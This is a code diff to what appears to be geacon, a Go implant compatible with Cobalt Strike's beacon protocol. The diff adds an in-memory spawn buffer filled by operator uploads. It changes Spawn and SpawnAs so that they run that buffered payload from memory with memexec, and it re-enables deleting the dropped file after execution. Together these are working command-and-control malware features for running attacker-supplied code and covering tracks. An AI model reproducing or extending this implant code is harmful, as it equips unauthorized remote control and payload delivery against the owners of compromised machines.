@@ -16,6 +16,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 	"unicode/utf16"
@@ -65,6 +66,7 @@ const (
 	CMD_TYPE_REG_QUERY     = 81 // WONTFIX: No Registry on UNIX
 	CMD_TYPE_PIVOT_LISTEN  = 82 // TBD
 	CMD_TYPE_CONNECT       = 86 // IMPLEMENTED
+	CMD_TYPE_EXEC_ASSEMBLY = 88 // TODO
 	CMD_TYPE_SPAWNAS_64    = 94 // TODO
 	CMD_TYPE_INLINE_EXEC   = 95 // WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
 	// CMD_TYPE_DISCONNECT	  		= ??
@@ -332,20 +334,38 @@ func ParseCommandUpload(b []byte) ([]byte, []byte) {
 
 }
 
-func Upload(filePath string, fileContent []byte) int {
-	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
-	if err != nil {
-		//fmt.Printf("file create err : %v\n", err)
+func Upload(filePath string, fileContent []byte, cmdType int) int {
+	if filePath == fmt.Sprintf("geacon-%d", config.GeaconId) {
+		fmt.Printf("Let's assume we are trying to upload a geacon spawn buffer\n")
+
+		if cmdType == CMD_TYPE_UPLOAD_START {
+			config.SpawnBuffer = config.SpawnBuffer[:0]
+			config.SpawnBuffer = append(config.SpawnBuffer, fileContent...)
+		} else {
+			config.SpawnBuffer = append(config.SpawnBuffer, fileContent...)
+		}
 		return 0
+	} else {
+		fileFlags := 0
+		if cmdType == CMD_TYPE_UPLOAD_START {
+			fileFlags = os.O_CREATE | os.O_TRUNC | os.O_WRONLY
+		} else {
+			fileFlags = os.O_APPEND | os.O_CREATE | os.O_WRONLY
+		}
+		fp, err := os.OpenFile(filePath, fileFlags, os.ModePerm)
+		if err != nil {
+			//fmt.Printf("file create err : %v\n", err)
+			return 0
+		}
+		defer fp.Close()
+		offset, err := fp.Write(fileContent)
+		if err != nil {
+			//fmt.Printf("file write err : %v\n", err)
+			return 0
+		}
+		//fmt.Printf("the offset is %d\n",offset)
+		return offset
 	}
-	defer fp.Close()
-	offset, err := fp.Write(fileContent)
-	if err != nil {
-		//fmt.Printf("file write err : %v\n", err)
-		return 0
-	}
-	//fmt.Printf("the offset is %d\n",offset)
-	return offset
 }
 func ChangeCurrentDir(path []byte) {
 	err := os.Chdir(string(path))
@@ -512,11 +532,24 @@ func ListProcesses() []byte {
 }
 
 func Spawn(arch string, b []byte) {
-	if CheckBeaconMagicBytes((b[:4])) {
-		processErrorTest(0, 0, 0, "Received Windows beacon DLL, aborting")
-	} else {
+
+	buf := bytes.NewBuffer(b)
+
+	payloadSupposedLengthBuf := make([]byte, buf.Len())
+	_, err := buf.Read(payloadSupposedLengthBuf)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+	payloadSupposedLengthString := string(payloadSupposedLengthBuf)
+	fmt.Printf("String length of payload expected: %s\n\n", payloadSupposedLengthString)
+	payloadSupposedLength, err := strconv.Atoi(payloadSupposedLengthString)
+
+	fmt.Printf("Length of payload expected: %d\n\n", payloadSupposedLength)
+
+	if len(config.SpawnBuffer) == payloadSupposedLength {
 		fmt.Printf("Spawning new process for arch %s\n", arch)
-		exe, err := memexec.New(b)
+		exe, err := memexec.New(config.SpawnBuffer)
 		if err != nil {
 			fmt.Println(err.Error())
 			panic(err)
@@ -534,6 +567,9 @@ func Spawn(arch string, b []byte) {
 			fmt.Println(err.Error())
 		}
 		fmt.Printf("Spawned new process successfully!\n")
+	} else {
+		fmt.Printf("Supposed length of payload is not equal to the payload we have stored. Aborting!\n")
+		processErrorTest(0, 0, 0, "Supposed length of payload is not equal to the payload we have stored.")
 	}
 }
 
@@ -585,21 +621,22 @@ func SpawnAs(arch string, b []byte) {
 		// panic(err)
 	}
 
-	payload := make([]byte, buf.Len())
-	_, err = buf.Read(payload)
+	payloadSupposedLengthBuf := make([]byte, buf.Len())
+	_, err = buf.Read(payloadSupposedLengthBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		// panic(err)
 	}
 
-	fmt.Printf("HEADER: [%x]\n", payload[:4])
+	payloadSupposedLengthString := string(payloadSupposedLengthBuf)
+	fmt.Printf("String length of payload expected: %s\n\n", payloadSupposedLengthString)
+	payloadSupposedLength, err := strconv.Atoi(payloadSupposedLengthString)
 
-	if CheckBeaconMagicBytes((payload[:4])) {
-		processErrorTest(0, 0, 0, "Received Windows beacon DLL, aborting")
-	} else {
+	fmt.Printf("Length of payload expected: %d\n\n", payloadSupposedLength)
 
+	if len(config.SpawnBuffer) == payloadSupposedLength {
 		fmt.Printf("Spawning new process for arch %s\n", arch)
-		exe, err := memexec.New(payload)
+		exe, err := memexec.New(config.SpawnBuffer)
 		if err != nil {
 			fmt.Println(err.Error())
 			panic(err)
@@ -635,13 +672,16 @@ func SpawnAs(arch string, b []byte) {
 		// }
 		fmt.Printf("%d\n", cmd.Process.Pid)
 
-		// err = os.Remove(path)
-		// if err != nil {
-		// 	processErrorTest(0, 0, 0, err.Error())
-		// }
-		// fmt.Printf("Cleaning up file %s .\n", path)
+		err = os.Remove(path)
+		if err != nil {
+			processErrorTest(0, 0, 0, err.Error())
+		}
+		fmt.Printf("Cleaning up file %s .\n", path)
 
 		fmt.Printf("Spawned new process successfully!\n")
+	} else {
+		fmt.Printf("Supposed length of payload is not equal to the payload we have stored. Aborting!\n")
+		processErrorTest(0, 0, 0, "Supposed length of payload is not equal to the payload we have stored.")
 	}
 }
 
